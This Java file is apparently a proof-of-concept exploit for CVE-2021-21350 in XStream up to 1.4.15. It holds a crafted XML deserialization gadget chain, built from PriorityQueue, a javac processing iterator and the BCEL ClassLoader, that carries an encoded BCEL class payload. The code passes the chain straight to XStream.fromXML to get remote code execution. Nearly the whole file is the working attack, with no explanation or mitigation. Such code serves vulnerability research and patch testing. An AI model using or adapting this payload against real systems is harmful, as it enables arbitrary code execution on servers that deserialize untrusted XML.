package org.example;

import com.thoughtworks.xstream.XStream;

/**
 * Code Execution BCEL <=1.4.15
 */
public class CVE_2021_21350 {
    public static void main(String[] args) {
        String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
                "  <unserializable-parents/>\n" +
                "  <java.util.PriorityQueue>\n" +
                "    <default>\n" +
                "      <size>2</size>\n" +
                "      <comparator class='javafx.collections.ObservableList$1'/>\n" +
                "    </default>\n" +
                "    <int>3</int>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "      <dataHandler>\n" +
                "        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n" +
                "          <contentType>text/plain</contentType>\n" +
                "          <is class='java.io.SequenceInputStream'>\n" +
                "            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n" +
                "              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>\n" +
                "                <names class='java.util.AbstractList$Itr'>\n" +
                "                  <cursor>0</cursor>\n" +
                "                  <lastRet>-1</lastRet>\n" +
                "                  <expectedModCount>0</expectedModCount>\n" +
                "                  <outer-class class='java.util.Arrays$ArrayList'>\n" +
                "                    <a class='string-array'>\n" +
                "                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$Ae$90$cbJ$c3$40$U$86$ff$d3$d4$a6$8d$a9$f6b$ab$ee$ea$caT$b0$a5$e0B$a8$b8$v$b8$b2$uFt$3d$j$87$90$g$93$90L$c47r$ddM$V$X$3e$80$P$a5$9e$R$c1$823$f0$P$e7$f0$cd7$97$8f$cf$b7w$AG$d8$r$94$f3btl$83$I$8d$b9x$U$c3H$c4$c1$f0b6WR$db$b0$I$8e$9f$U$99Tga$a4$I5$D$P$MG$a8$9c$84q$a8O$J$96$d7$bfqa$a3$ea$a0$8c$g$h$t$c9$j$b3$cd$3f$ddU$R$eb$f0A$d9p$d9$X$u$fd$5b$T$3a$5e$ff$fc$l6v$b1$81M$Hu4$I$dd$qUq$efP$f4$s$o$92E$qt$92$ND$9aV$d1$e2$83$d4$93$92$84$7do$c5$e1$eb$y$8c$83$f1$aa$f62K$a4$cas$d6n$a1c$b4$5dB$dd$d7B$deOEz$zf$91$c2$kJ$7cw3$88$t$3f$85s$9d$ab$Rw$z$5e$db$H$_p$9e$f9$3b$a6$afh$b6$daKl$df$$$7e$e0$jN$X$f4$c5$7b$c8f$89$e9$adq$96P$f9$G$5d$404$a6e$B$A$A</string>\n" +
                "                    </a>\n" +
                "                  </outer-class>\n" +
                "                </names>\n" +
                "                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>\n" +
                "                  <parent class='sun.misc.Launcher$ExtClassLoader'>\n" +
                "                  </parent>\n" +
                "                  <package2certs class='hashtable'/>\n" +
                "                  <classes defined-in='java.lang.ClassLoader'/>\n" +
                "                  <defaultDomain>\n" +
                "                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>\n" +
                "                    <principals/>\n" +
                "                    <hasAllPerm>false</hasAllPerm>\n" +
                "                    <staticPermissions>false</staticPermissions>\n" +
                "                    <key>\n" +
                "                      <outer-class reference='../..'/>\n" +
                "                    </key>\n" +
                "                  </defaultDomain>\n" +
                "                  <packages/>\n" +
                "                  <nativeLibraries/>\n" +
                "                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>\n" +
                "                  <defaultAssertionStatus>false</defaultAssertionStatus>\n" +
                "                  <classes/>\n" +
                "                  <ignored__packages>\n" +
                "                    <string>java.</string>\n" +
                "                    <string>javax.</string>\n" +
                "                    <string>sun.</string>\n" +
                "                  </ignored__packages>\n" +
                "                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>\n" +
                "                    <__path>\n" +
                "                      <paths/>\n" +
                "                      <class__path>.</class__path>\n" +
                "                    </__path>\n" +
                "                    <__loadedClasses/>\n" +
                "                  </repository>\n" +
                "                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>\n" +
                "                </processorCL>\n" +
                "              </iterator>\n" +
                "              <type>KEYS</type>\n" +
                "            </e>\n" +
                "            <in class='java.io.ByteArrayInputStream'>\n" +
                "              <buf></buf>\n" +
                "              <pos>0</pos>\n" +
                "              <mark>0</mark>\n" +
                "              <count>0</count>\n" +
                "            </in>\n" +
                "          </is>\n" +
                "          <consumed>false</consumed>\n" +
                "        </dataSource>\n" +
                "        <transferFlavors/>\n" +
                "      </dataHandler>\n" +
                "      <dataLen>0</dataLen>\n" +
                "    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>\n" +
                "    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>\n" +
                "  </java.util.PriorityQueue>\n" +
                "</java.util.PriorityQueue>";

        XStream xstream = new XStream();
        xstream.fromXML(xml);
    }

}
